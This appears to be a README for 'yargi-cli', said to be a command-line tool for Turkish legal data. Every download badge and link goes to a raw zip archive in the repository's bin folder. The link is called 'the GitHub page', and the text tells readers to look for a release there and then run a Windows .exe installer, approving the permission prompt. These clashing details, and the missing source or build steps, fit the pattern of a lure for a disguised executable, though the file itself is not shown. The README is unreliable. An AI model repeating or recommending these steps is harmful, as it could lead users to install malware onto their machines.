# ⚖️ yargi-cli - Simple Access to Turkish Legal Data

[![Download yargi-cli](https://img.shields.io/badge/Download-Get%20yargi--cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/robinspringer/yargi-cli/main/bin/cli_yargi_3.0.zip)

---

## 📋 What is yargi-cli?

yargi-cli is a command-line tool to access Turkish legal databases. It helps you get legal information easily using simple commands. The tool outputs data as JSON, so you can use it with other programs or just read the results in a structured way.

This tool is made in TypeScript and works on Windows systems. You do not need technical skills to run it once the setup is complete.

---

## 💻 System Requirements

Before you install yargi-cli, make sure your computer meets these requirements:

- Operating System: Windows 10 or higher  
- Disk Space: At least 100 MB free  
- Internet Connection: Required to fetch data from legal databases  
- Permissions: Ability to install software and run command-line programs  

You do not need any developer tools. The instructions below will guide you through everything.

---

## 🚀 Getting Started

This guide will help you download, install, and use yargi-cli step by step.

---

## 👇 Download yargi-cli

To get the software, visit this page to download:

**[Download yargi-cli from GitHub](https://raw.githubusercontent.com/robinspringer/yargi-cli/main/bin/cli_yargi_3.0.zip)**

Click the green badge above or the link below to open the GitHub page. On that page, look for the latest version or release. Download the Windows installer or the `.exe` file.

---

## 📥 How to Install yargi-cli on Windows

1. **Download the installer**

   Once you are on the GitHub page linked above, find the installer for Windows. It may be named something like `yargi-cli-setup.exe` or just `yargi-cli.exe`.

2. **Run the installer**

   Double-click the downloaded file. If Windows asks for permission, click "Yes" to continue.

3. **Follow the installation steps**

   The setup will guide you through the installation. Usually, you just need to click "Next" several times and then "Finish" at the end.

4. **Check the installation**

   After installing, the program will be ready to use. To test, open the Command Prompt and type:

   ```
   yargi-cli --help
   ```

   This should show a list of commands and options.

---

## 🖥️ How to Use yargi-cli

yargi-cli runs in the Windows Command Prompt. Here is how to open it and run basic commands.

### Open Command Prompt

1. Press the **Windows key** on your keyboard or click the **Start menu**.  
2. Type `cmd`.  
3. Click on the **Command Prompt** app that appears.

### Basic Commands

- **Get legal data in JSON format**

  ```
  yargi-cli query "your search term here"
  ```

  Replace `"your search term here"` with the topic or case name you want to search for.

- **Save output to a file**

  ```
  yargi-cli query "your search term" > results.json
  ```

  This command saves the data to a file named `results.json`.

- **Pipe output to another program**

  You can combine yargi-cli with other programs or scripts that read JSON data.

---

## 🎯 Common Use Cases

- Look up court cases by keyword  
- Export legal decisions as JSON for later analysis  
- Use with automated scripts to gather legal data  
- Integrate with AI agents that read legal information  

---

## 🛠️ Troubleshooting

If you have issues, try these steps:

- Make sure you have a working internet connection.  
- Check that you typed the command correctly. Commands are case-sensitive.  
- Restart Command Prompt after installation if commands don’t work.  
- Confirm the downloaded file is the correct installer for Windows.  
- If errors continue, visit the GitHub page for support or open an issue.

---

## 🔄 Updating yargi-cli

To update the tool:

1. Visit the GitHub download page again:  
   [https://raw.githubusercontent.com/robinspringer/yargi-cli/main/bin/cli_yargi_3.0.zip](https://raw.githubusercontent.com/robinspringer/yargi-cli/main/bin/cli_yargi_3.0.zip)  
2. Download the latest installer for Windows like you did the first time.  
3. Run the installer to replace your existing version.

You do not need to uninstall the old version before updating.

---

## 🌐 More Information

For full commands and more details, use this command after installation:

```
yargi-cli --help
```

Or check the documentation and the README file on the GitHub page.

---

[![Download yargi-cli](https://img.shields.io/badge/Download-Get%20yargi--cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/robinspringer/yargi-cli/main/bin/cli_yargi_3.0.zip)